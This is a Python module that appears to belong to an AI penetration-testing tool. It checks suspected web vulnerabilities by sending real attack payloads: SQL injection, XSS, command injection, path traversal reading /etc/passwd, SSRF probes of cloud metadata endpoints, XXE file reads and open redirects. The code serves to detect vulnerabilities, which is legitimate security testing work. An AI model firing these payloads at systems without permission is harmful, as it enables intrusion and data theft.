"""
Deterministic Validator — The zero-false-positives layer.

This module validates vulnerability findings WITHOUT using an LLM.
The AI agent discovers potential vulns, but this module PROVES them.

This is how XBOW achieves zero false positives — creative AI exploration
paired with deterministic, code-based validation.
"""

from typing import Optional
import httpx
import uuid
import re

def _make_client():
    """Create a fresh httpx client with no cookie jar accumulation."""
    return httpx.Client(timeout=15, follow_redirects=True, verify=False)

_client = _make_client()


def _reset_client():
    """Reset client to avoid cookie contamination between tests.

    httpx clients accumulate Set-Cookie headers from responses in their
    internal cookie jar. When testing different auth states (e.g., IDOR sends
    unauthenticated requests), stale cookies can override the ones we pass
    explicitly, breaking subsequent tests.
    """
    global _client
    _client.cookies.clear()
    return _client


def generate_canary():
    """Generate a unique canary string for validation."""
    return "CANARY_{}".format(uuid.uuid4().hex[:16])


def validate_sqli(url, method, param_name, payload, cookies=None, extra_params=None):
    """
    Validate SQL injection using three methods:
    1. Error-based: check for database error messages
    2. Blind boolean-based: compare response lengths for true vs false conditions
    3. UNION-based: check for leaked data
    """
    if extra_params is None:
        extra_params = {}

    # Known database error patterns
    error_patterns = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your (MySQL|MariaDB)",
        r"PostgreSQL.*ERROR",
        r"pg_query\(\).*failed",
        r"SQLite3?::SQLException",
        r"ORA-\d{5}",
        r"Microsoft OLE DB Provider for SQL Server",
        r"Unclosed quotation mark",
        r"SQLSTATE\[",
    ]

    def send_request(p):
        params = dict(extra_params)
        params[param_name] = p
        if method.upper() == "GET":
            return _client.get(url, params=params, cookies=cookies or {})
        else:
            return _client.post(url, data=params, cookies=cookies or {})

    # --- Method 1: Error-based ---
    try:
        resp = send_request(payload)
        for pattern in error_patterns:
            if re.search(pattern, resp.text, re.IGNORECASE):
                return {
                    "validated": True,
                    "type": "SQL Injection (Error-based)",
                    "evidence": "Matched pattern: {}".format(pattern),
                    "url": url,
                    "payload": payload,
                }
    except Exception:
        pass

    # --- Method 2: Blind boolean-based ---
    # Send a true condition and a false condition, compare response lengths
    try:
        # Normal request
        resp_normal = send_request("1")
        normal_len = len(resp_normal.text)

        # Always-true condition
        resp_true = send_request("1' OR '1'='1' #")
        true_len = len(resp_true.text)

        # Always-false condition
        resp_false = send_request("1' AND '1'='2' #")
        false_len = len(resp_false.text)

        # If true gives more content than false, likely SQLi
        # (true condition returns data, false returns nothing)
        if true_len > false_len and (true_len - false_len) > 50:
            return {
                "validated": True,
                "type": "SQL Injection (Blind Boolean-based)",
                "evidence": "True condition response ({} bytes) significantly larger than false ({} bytes)".format(
                    true_len, false_len
                ),
                "url": url,
                "payload": "1' OR '1'='1' #",
            }

        # Also check: true gives same as normal but different from false
        if abs(normal_len - true_len) < 50 and abs(normal_len - false_len) > 50:
            return {
                "validated": True,
                "type": "SQL Injection (Blind Boolean-based)",
                "evidence": "Normal and TRUE give same result, FALSE is different (normal={}, true={}, false={} bytes)".format(
                    normal_len, true_len, false_len
                ),
                "url": url,
                "payload": "1' AND '1'='2' #",
            }
    except Exception:
        pass

    # --- Method 3: UNION-based ---
    # Try to extract data using UNION SELECT
    try:
        union_payloads = [
            "1' UNION SELECT user(),version() #",
            "1' UNION SELECT null,version() #",
            "1 UNION SELECT user(),version() #",
        ]
        for up in union_payloads:
            resp = send_request(up)
            # Check if MySQL version string appears
            if re.search(r"\d+\.\d+\.\d+", resp.text) and ("MariaDB" in resp.text or "mysql" in resp.text.lower()):
                return {
                    "validated": True,
                    "type": "SQL Injection (UNION-based)",
                    "evidence": "Database version leaked in response",
                    "url": url,
                    "payload": up,
                }
    except Exception:
        pass

    return {"validated": False, "reason": "No SQL injection confirmed"}


def validate_xss(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate XSS by injecting a unique canary and checking if it
    appears unescaped in the response.
    """
    if extra_params is None:
        extra_params = {}
    canary = generate_canary()
    payload = "<script>{}</script>".format(canary)

    try:
        params = dict(extra_params)
        params[param_name] = payload
        if method.upper() == "GET":
            resp = _client.get(url, params=params, cookies=cookies or {})
        else:
            resp = _client.post(url, data=params, cookies=cookies or {})

        # Check if our canary appears in a script tag (unescaped)
        if "<script>{}</script>".format(canary) in resp.text:
            return {
                "validated": True,
                "type": "Cross-Site Scripting (Reflected XSS)",
                "evidence": "Canary {} reflected unescaped in response".format(canary),
                "url": url,
                "payload": payload,
            }

        # Check if canary appears at all (might be in attribute context)
        if canary in resp.text:
            return {
                "validated": True,
                "type": "Cross-Site Scripting (Potential)",
                "evidence": "Canary {} reflected in response (check context)".format(canary),
                "url": url,
                "payload": payload,
            }

        return {"validated": False, "reason": "Canary not found in response"}
    except Exception as e:
        return {"validated": False, "reason": str(e)}


def validate_command_injection(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate command injection by injecting a canary via echo
    and checking if it appears in the response.
    Includes Submit param for DVWA compatibility.
    """
    if extra_params is None:
        extra_params = {}
    canary = generate_canary()

    # Try common injection patterns with a valid prefix (127.0.0.1)
    payloads = [
        "127.0.0.1; echo {}".format(canary),
        "127.0.0.1 | echo {}".format(canary),
        "127.0.0.1 & echo {}".format(canary),
        "127.0.0.1 && echo {}".format(canary),
        "; echo {}".format(canary),
        "| echo {}".format(canary),
        "& echo {}".format(canary),
        "`echo {}`".format(canary),
        "$(echo {})".format(canary),
    ]

    for payload in payloads:
        try:
            params = dict(extra_params)
            params[param_name] = payload
            # Always include Submit for DVWA forms
            if "Submit" not in params:
                params["Submit"] = "Submit"

            if method.upper() == "GET":
                resp = _client.get(url, params=params, cookies=cookies or {})
            else:
                resp = _client.post(url, data=params, cookies=cookies or {})

            if canary in resp.text:
                return {
                    "validated": True,
                    "type": "Command Injection",
                    "evidence": "Canary {} found in response".format(canary),
                    "url": url,
                    "payload": payload,
                }
        except Exception:
            continue

    return {"validated": False, "reason": "No command injection confirmed"}


def validate_path_traversal(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate path traversal / local file inclusion by trying to read
    known files and checking for their expected content.
    Supports both query-param based and URL-rewrite based inclusion.
    """
    if extra_params is None:
        extra_params = {}

    # Known file paths and content markers
    checks = [
        # Linux
        ("../../../etc/passwd", "root:"),
        ("../../etc/passwd", "root:"),
        ("../../../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        # Deeper traversal
        ("..%2F..%2F..%2Fetc%2Fpasswd", "root:"),
        # Windows
        ("..\\..\\..\\windows\\win.ini", "[fonts]"),
    ]

    for payload, expected in checks:
        try:
            # Method 1: As a query parameter
            params = dict(extra_params)
            params[param_name] = payload
            if method.upper() == "GET":
                resp = _client.get(url, params=params, cookies=cookies or {})
            else:
                resp = _client.post(url, data=params, cookies=cookies or {})

            if expected in resp.text:
                return {
                    "validated": True,
                    "type": "Path Traversal / Local File Inclusion",
                    "evidence": "Found '{}' in response".format(expected),
                    "url": url,
                    "payload": payload,
                }
        except Exception:
            continue

    # Method 2: Direct URL replacement for file inclusion
    # For URLs like /vulnerabilities/fi/?page=include.php
    # Replace the page value directly in the URL
    try:
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if param_name in qs:
            for payload, expected in checks:
                qs_copy = dict(qs)
                qs_copy[param_name] = [payload]
                new_query = urlencode(qs_copy, doseq=True)
                new_url = urlunparse(parsed._replace(query=new_query))
                resp = _client.get(new_url, cookies=cookies or {})
                if expected in resp.text:
                    return {
                        "validated": True,
                        "type": "Local File Inclusion",
                        "evidence": "Found '{}' in response via direct URL".format(expected),
                        "url": new_url,
                        "payload": payload,
                    }
    except Exception:
        pass

    return {"validated": False, "reason": "No path traversal confirmed"}


def validate_csrf(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate CSRF by checking if state-changing forms lack CSRF protection.
    Three checks:
    1. Form has no CSRF token at all
    2. Form accepts requests without the CSRF token
    3. Form accepts a blank/removed CSRF token
    """
    if extra_params is None:
        extra_params = {}

    csrf_patterns = [
        "csrf", "csrftoken", "csrf_token", "_csrf", "token",
        "user_token", "_token", "csrfmiddlewaretoken",
        "authenticity_token", "__requestverificationtoken",
        "anticsrf", "xsrf_token", "_xsrf",
    ]

    try:
        from bs4 import BeautifulSoup

        # Fetch the page
        resp = _client.get(url, cookies=cookies or {})
        soup = BeautifulSoup(resp.text, "html.parser")

        for form in soup.find_all("form"):
            form_method = form.get("method", "GET").upper()
            # Check both POST forms and GET forms with state-changing params
            state_changing_params = ["password", "email", "delete", "remove", "update",
                                     "create", "edit", "change", "admin", "role"]
            form_inputs = [i.get("name", "").lower() for i in form.find_all(["input", "textarea"])]
            is_state_changing = any(p in " ".join(form_inputs) for p in state_changing_params)
            if form_method != "POST" and not is_state_changing:
                continue

            # Check all hidden inputs for CSRF-like names
            hidden_inputs = form.find_all("input", {"type": "hidden"})
            csrf_field = None
            for inp in hidden_inputs:
                name = inp.get("name", "").lower()
                for pattern in csrf_patterns:
                    if pattern in name:
                        csrf_field = inp.get("name", "")
                        break
                if csrf_field:
                    break

            # Check 1: No CSRF token at all
            if not csrf_field:
                action = form.get("action", "")
                from urllib.parse import urljoin
                full_action = urljoin(url, action) if action else url
                return {
                    "validated": True,
                    "type": "Cross-Site Request Forgery (CSRF)",
                    "evidence": "POST form at {} has no CSRF token field".format(full_action),
                    "url": full_action,
                    "payload": "No CSRF token present",
                }

            # Check 2: Submit without CSRF token
            form_data = dict(extra_params)
            for inp in form.find_all(["input", "textarea"]):
                name = inp.get("name", "")
                if name and name != csrf_field:
                    form_data[name] = inp.get("value", "test")

            # Include submit buttons
            for btn in form.find_all(["input", "button"]):
                if btn.get("type", "").lower() == "submit" and btn.get("name"):
                    form_data[btn.get("name")] = btn.get("value", "Submit")

            action = form.get("action", "")
            from urllib.parse import urljoin
            full_action = urljoin(url, action) if action else url

            resp_no_csrf = _client.post(full_action, data=form_data, cookies=cookies or {})

            # If we get a 200 and no error about invalid token, CSRF is not enforced
            error_indicators = ["invalid token", "csrf", "forbidden", "403",
                                "expired token", "token mismatch"]
            has_error = any(ind in resp_no_csrf.text.lower() for ind in error_indicators)

            if resp_no_csrf.status_code == 200 and not has_error:
                return {
                    "validated": True,
                    "type": "Cross-Site Request Forgery (CSRF)",
                    "evidence": "Form accepts requests without CSRF token (status {})".format(
                        resp_no_csrf.status_code
                    ),
                    "url": full_action,
                    "payload": "Submitted form without {} field".format(csrf_field),
                }

    except Exception as e:
        return {"validated": False, "reason": str(e)}

    return {"validated": False, "reason": "CSRF protection appears to be in place"}


def validate_idor(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate Insecure Direct Object Reference (IDOR) by comparing
    responses for different ID values.
    """
    if extra_params is None:
        extra_params = {}

    test_ids = ["1", "2", "3", "999", "0"]

    def send_request(id_val):
        params = dict(extra_params)
        params[param_name] = id_val
        if method.upper() == "GET":
            return _client.get(url, params=params, cookies=cookies or {})
        else:
            return _client.post(url, data=params, cookies=cookies or {})

    try:
        # Get baseline with first ID
        resp1 = send_request(test_ids[0])
        if resp1.status_code != 200:
            return {"validated": False, "reason": "Baseline request failed (status {})".format(resp1.status_code)}

        # Try other IDs
        for other_id in test_ids[1:]:
            resp2 = send_request(other_id)
            if resp2.status_code != 200:
                continue

            # Both return 200 with different content = different records served
            len1 = len(resp1.text)
            len2 = len(resp2.text)
            if resp1.text != resp2.text and len1 > 200 and len2 > 200:
                # Now check: does it work WITHOUT authentication?
                no_auth_resp = None
                try:
                    params = dict(extra_params)
                    params[param_name] = other_id
                    if method.upper() == "GET":
                        no_auth_resp = _client.get(url, params=params, cookies={})
                    else:
                        no_auth_resp = _client.post(url, data=params, cookies={})
                except Exception:
                    pass

                unauthenticated_access = (
                    no_auth_resp is not None
                    and no_auth_resp.status_code == 200
                    and len(no_auth_resp.text) > 200
                )

                evidence = "ID={} and ID={} return different data ({} vs {} bytes)".format(
                    test_ids[0], other_id, len1, len2
                )
                if unauthenticated_access:
                    evidence += " — also accessible without authentication"

                return {
                    "validated": True,
                    "type": "Insecure Direct Object Reference (IDOR)",
                    "evidence": evidence,
                    "url": url,
                    "payload": "{}={}".format(param_name, other_id),
                }

    except Exception as e:
        return {"validated": False, "reason": str(e)}

    return {"validated": False, "reason": "No IDOR confirmed"}


def validate_open_redirect(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate open redirect by injecting an external domain and checking
    if the server redirects to it.
    """
    if extra_params is None:
        extra_params = {}

    canary = generate_canary()
    redirect_targets = [
        "https://evil.example.com/{}".format(canary),
        "//evil.example.com/{}".format(canary),
        "http://evil.example.com/{}".format(canary),
        "/\\evil.example.com/{}".format(canary),
        "https:evil.example.com/{}".format(canary),
    ]

    no_redirect_client = httpx.Client(timeout=15, follow_redirects=False, verify=False)

    for target in redirect_targets:
        try:
            params = dict(extra_params)
            params[param_name] = target
            if method.upper() == "GET":
                resp = no_redirect_client.get(url, params=params, cookies=cookies or {})
            else:
                resp = no_redirect_client.post(url, data=params, cookies=cookies or {})

            # Check for redirect to our target
            if resp.status_code in (301, 302, 303, 307, 308):
                location = resp.headers.get("location", "")
                if "evil.example.com" in location:
                    return {
                        "validated": True,
                        "type": "Open Redirect",
                        "evidence": "Server redirects to attacker domain: {}".format(location),
                        "url": url,
                        "payload": target,
                    }

            # Check for meta refresh or JS redirect in body
            if resp.status_code == 200 and "evil.example.com" in resp.text:
                return {
                    "validated": True,
                    "type": "Open Redirect (via page content)",
                    "evidence": "Attacker domain appears in response body (meta refresh or JS redirect)",
                    "url": url,
                    "payload": target,
                }

        except Exception:
            continue

    return {"validated": False, "reason": "No open redirect confirmed"}


def validate_ssrf(url, method, param_name, cookies=None, extra_params=None):
    """
    Validate SSRF by making the server fetch internal resources
    and comparing responses against a baseline.
    """
    if extra_params is None:
        extra_params = {}

    def send_request(target_url):
        params = dict(extra_params)
        params[param_name] = target_url
        if method.upper() == "GET":
            return _client.get(url, params=params, cookies=cookies or {})
        else:
            return _client.post(url, data=params, cookies=cookies or {})

    try:
        # Baseline: non-routable IP (should timeout/fail server-side)
        baseline_resp = send_request("http://192.0.2.1/")
        baseline_len = len(baseline_resp.text)

        # Test internal resources
        internal_targets = [
            ("http://127.0.0.1/", "localhost web server"),
            ("http://127.0.0.1:22/", "SSH service"),
            ("http://127.0.0.1:3306/", "MySQL service"),
            ("http://127.0.0.1:6379/", "Redis service"),
            ("http://localhost/", "localhost"),
            ("file:///etc/passwd", "/etc/passwd via file://"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
        ]

        for target, description in internal_targets:
            try:
                resp = send_request(target)
                resp_len = len(resp.text)

                # Significant difference from baseline = server fetched the resource
                if abs(resp_len - baseline_len) > 100:
                    # Extra check for specific content
                    evidence_markers = {
                        "root:": "Unix passwd file content",
                        "ami-id": "AWS instance metadata",
                        "instance-id": "AWS instance metadata",
                        "<html": "HTML content from internal server",
                        "SSH": "SSH banner",
                        "redis_version": "Redis info",
                    }

                    specific_evidence = None
                    for marker, desc in evidence_markers.items():
                        if marker in resp.text and marker not in baseline_resp.text:
                            specific_evidence = desc
                            break

                    if specific_evidence or abs(resp_len - baseline_len) > 500:
                        return {
                            "validated": True,
                            "type": "Server-Side Request Forgery (SSRF)",
                            "evidence": "Server fetched {} — {} ({} bytes vs baseline {} bytes){}".format(
                                target, description, resp_len, baseline_len,
                                " [{}]".format(specific_evidence) if specific_evidence else ""
                            ),
                            "url": url,
                            "payload": target,
                        }
            except Exception:
                continue

    except Exception as e:
        return {"validated": False, "reason": str(e)}

    return {"validated": False, "reason": "No SSRF confirmed"}


def validate_security_headers(url, method="GET", param_name="", cookies=None, extra_params=None):
    """
    Check for missing security headers.
    This is a passive check — no injection needed.
    """
    try:
        resp = _client.get(url, cookies=cookies or {})
        headers = {k.lower(): v for k, v in resp.headers.items()}

        missing = []
        info_leak = {}

        # Required security headers
        if "x-frame-options" not in headers:
            # Check if CSP has frame-ancestors instead
            csp = headers.get("content-security-policy", "")
            if "frame-ancestors" not in csp:
                missing.append("X-Frame-Options")

        if "x-content-type-options" not in headers:
            missing.append("X-Content-Type-Options")

        if url.startswith("https://") and "strict-transport-security" not in headers:
            missing.append("Strict-Transport-Security (HSTS)")

        if "content-security-policy" not in headers:
            missing.append("Content-Security-Policy")

        if "referrer-policy" not in headers:
            missing.append("Referrer-Policy")

        if "permissions-policy" not in headers:
            missing.append("Permissions-Policy")

        # Info leak headers
        if "server" in headers:
            server = headers["server"]
            if any(v in server.lower() for v in ["apache/", "nginx/", "iis/", "php/"]):
                info_leak["Server"] = server

        if "x-powered-by" in headers:
            info_leak["X-Powered-By"] = headers["x-powered-by"]

        # Check cookies for missing flags
        insecure_cookies = []
        for cookie_header in resp.headers.get_list("set-cookie"):
            cookie_lower = cookie_header.lower()
            cookie_name = cookie_header.split("=")[0].strip()
            issues = []
            if "httponly" not in cookie_lower:
                issues.append("missing HttpOnly")
            if "secure" not in cookie_lower and url.startswith("https://"):
                issues.append("missing Secure")
            if "samesite" not in cookie_lower:
                issues.append("missing SameSite")
            if issues:
                insecure_cookies.append("{}: {}".format(cookie_name, ", ".join(issues)))

        if missing or info_leak or insecure_cookies:
            evidence_parts = []
            if missing:
                evidence_parts.append("Missing headers: {}".format(", ".join(missing)))
            if info_leak:
                evidence_parts.append("Info leak: {}".format(
                    ", ".join("{}={}".format(k, v) for k, v in info_leak.items())
                ))
            if insecure_cookies:
                evidence_parts.append("Insecure cookies: {}".format("; ".join(insecure_cookies)))

            return {
                "validated": True,
                "type": "Missing Security Headers",
                "evidence": " | ".join(evidence_parts),
                "url": url,
                "missing_headers": missing,
                "info_leak_headers": info_leak,
                "insecure_cookies": insecure_cookies,
                "payload": "N/A (passive check)",
            }

    except Exception as e:
        return {"validated": False, "reason": str(e)}

    return {"validated": False, "reason": "All security headers present"}


def validate_sensitive_data(url, method="GET", param_name="", cookies=None, extra_params=None):
    """
    Scan response for leaked sensitive data patterns:
    emails, credit cards, SSNs, API keys, internal IPs, stack traces.
    """
    try:
        if method.upper() == "GET":
            resp = _client.get(url, cookies=cookies or {})
        else:
            params = dict(extra_params or {})
            resp = _client.post(url, data=params, cookies=cookies or {})

        text = resp.text
        findings = []

        # Credit card numbers (Visa, MasterCard, Amex)
        cc_pattern = r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\b'
        cc_matches = re.findall(cc_pattern, text)
        if cc_matches:
            findings.append("Credit card numbers: {} found".format(len(cc_matches)))

        # SSN pattern
        ssn_pattern = r'\b\d{3}-\d{2}-\d{4}\b'
        ssn_matches = re.findall(ssn_pattern, text)
        if ssn_matches:
            findings.append("SSN-like patterns: {} found".format(len(ssn_matches)))

        # API keys / secrets in code or config
        secret_pattern = r'(?:api[_-]?key|secret[_-]?key|access[_-]?token|private[_-]?key)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})'
        secret_matches = re.findall(secret_pattern, text, re.IGNORECASE)
        if secret_matches:
            findings.append("Potential API keys/secrets: {} found".format(len(secret_matches)))

        # Internal IP addresses
        internal_ip_pattern = r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b'
        ip_matches = re.findall(internal_ip_pattern, text)
        if ip_matches:
            unique_ips = set(ip_matches)
            findings.append("Internal IPs: {} ({})".format(len(unique_ips), ", ".join(list(unique_ips)[:3])))

        # Stack traces / debug info
        debug_patterns = [
            r'Traceback \(most recent call last\)',
            r'at .+\.java:\d+',
            r'File ".+\.py", line \d+',
            r'Exception in .+',
            r'stack trace',
            r'SQLSTATE\[',
            r'Parse error:.*in /',
        ]
        for dp in debug_patterns:
            if re.search(dp, text, re.IGNORECASE):
                findings.append("Debug/stack trace info exposed")
                break

        # Password fields with values pre-filled
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(text, "html.parser")
        for inp in soup.find_all("input", {"type": "password"}):
            if inp.get("value"):
                findings.append("Password field has pre-filled value")
                break

        if findings:
            return {
                "validated": True,
                "type": "Sensitive Data Exposure",
                "evidence": " | ".join(findings),
                "url": url,
                "details": findings,
                "payload": "N/A (passive scan)",
            }

    except Exception as e:
        return {"validated": False, "reason": str(e)}

    return {"validated": False, "reason": "No sensitive data exposure found"}


def validate_xxe(url, method="POST", param_name="", cookies=None, extra_params=None):
    """
    Validate XML External Entity (XXE) injection using multiple vectors:
    1. Basic XXE with file:///etc/passwd
    2. Parameter entity XXE
    3. Different file targets (hostname, environ, win.ini)
    4. Blind XXE via error messages
    5. SVG XXE injection
    Evidence: actual file content from response indicating successful file read.
    """
    if extra_params is None:
        extra_params = {}

    def send_xml_request(xml_payload):
        """Send XML payload and return response."""
        try:
            if method.upper() == "GET":
                # For GET, try to send XML in body if param_name exists
                params = dict(extra_params)
                if param_name:
                    params[param_name] = xml_payload
                return _client.get(url, params=params, cookies=cookies or {})
            else:
                # For POST, send as raw body (application/xml) if no param, else as form data
                params = dict(extra_params)
                if param_name:
                    params[param_name] = xml_payload
                    return _client.post(url, data=params, cookies=cookies or {},
                                      headers={"Content-Type": "application/x-www-form-urlencoded"})
                else:
                    return _client.post(url, content=xml_payload, cookies=cookies or {},
                                      headers={"Content-Type": "application/xml"})
        except Exception:
            return None

    # File content markers for validation
    file_checks = [
        ("file:///etc/passwd", ["root:x:", "root:*:", "root:0:0:", "nobody:x:"]),
        ("file:///etc/hostname", ["localhost", "debian", "ubuntu"]),
        ("file:///proc/self/environ", ["PATH=", "HOME=", "USER="]),
        ("file:///c:/windows/win.ini", ["[fonts]", "[extensions]", "[files]"]),
    ]

    # Test 1: Basic XXE with external entity
    for target_file, markers in file_checks:
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{}">]>
<root><data>&xxe;</data></root>""".format(target_file)

        resp = send_xml_request(xxe_payload)
        if resp and resp.status_code == 200:
            for marker in markers:
                if marker in resp.text:
                    return {
                        "validated": True,
                        "type": "XML External Entity (XXE) Injection",
                        "evidence": "File read confirmed — '{}' found in response for {}".format(
                            marker, target_file.split("/")[-1]
                        ),
                        "url": url,
                        "payload": xxe_payload,
                        "file_read": target_file,
                    }

    # Test 2: Parameter entity XXE
    for target_file, markers in file_checks:
        pe_xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}"> %xxe;]>
<root>test</root>""".format(target_file)

        resp = send_xml_request(pe_xxe)
        if resp and resp.status_code == 200:
            for marker in markers:
                if marker in resp.text:
                    return {
                        "validated": True,
                        "type": "XML External Entity (XXE) Injection",
                        "evidence": "Parameter entity XXE confirmed — '{}' found for {}".format(
                            marker, target_file.split("/")[-1]
                        ),
                        "url": url,
                        "payload": pe_xxe,
                        "file_read": target_file,
                    }

    # Test 3: Blind XXE via error messages
    blind_xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent/file">]>
<root>&xxe;</root>"""

    resp = send_xml_request(blind_xxe)
    if resp and resp.status_code in (400, 500):
        error_indicators = ["no such file", "cannot open", "file not found", "open_basedir",
                           "entity", "xml", "parse", "doctype"]
        error_in_response = any(ind in resp.text.lower() for ind in error_indicators)
        if error_in_response and len(resp.text) > 100:
            return {
                "validated": True,
                "type": "XML External Entity (XXE) Injection",
                "evidence": "Blind XXE via error message — server threw exception on entity reference",
                "url": url,
                "payload": blind_xxe,
            }

    # Test 4: SVG XXE (image upload endpoints)
    for target_file, markers in file_checks[:2]:  # Just test first 2 files for SVG
        svg_xxe = """<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{}">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>""".format(target_file)

        resp = send_xml_request(svg_xxe)
        if resp and resp.status_code == 200:
            for marker in markers:
                if marker in resp.text:
                    return {
                        "validated": True,
                        "type": "XML External Entity (XXE) Injection",
                        "evidence": "SVG XXE confirmed — '{}' found in response".format(marker),
                        "url": url,
                        "payload": svg_xxe,
                        "file_read": target_file,
                    }

    return {"validated": False, "reason": "No XXE injection confirmed"}
